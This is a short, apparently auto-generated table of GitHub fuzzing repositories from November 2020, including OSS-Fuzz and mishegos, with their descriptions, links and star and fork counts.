+| 20201112T12:30:42Z | Sometimes we want to fuzz a set of domain URLs with a common wordlist. Fuzzing them one by one is a tedious task and not to mention the false positives we obtain in those results. To solve this problem I created Lazy FuzzZ.  | https://github.com/th3hack3rwiz/Lazy-FuzzZ | 0 | 0| 
+| 20201112T12:23:45Z | mitmproxy simple fuzzer addon | https://github.com/knrdv/mitm-fuzzer | 0 | 0| 
+| 20201112T12:17:07Z | The Official Fuzzy Britches Repository. | https://github.com/ThePapaw/fuzzybritches | 0 | 0| 
+| 20201112T12:14:48Z | OSS-Fuzz - continuous fuzzing of open source software. | https://github.com/google/oss-fuzz | 5646 | 1113| 
+| 20201112T11:56:07Z | A differential fuzzer for x86 decoders | https://github.com/trailofbits/mishegos | 120 | 17| 
+| 20201112T11:44:55Z | Null | https://github.com/WiseSecurity/pokemon-fuzzing-example | 0 | 0| 
 
 
 
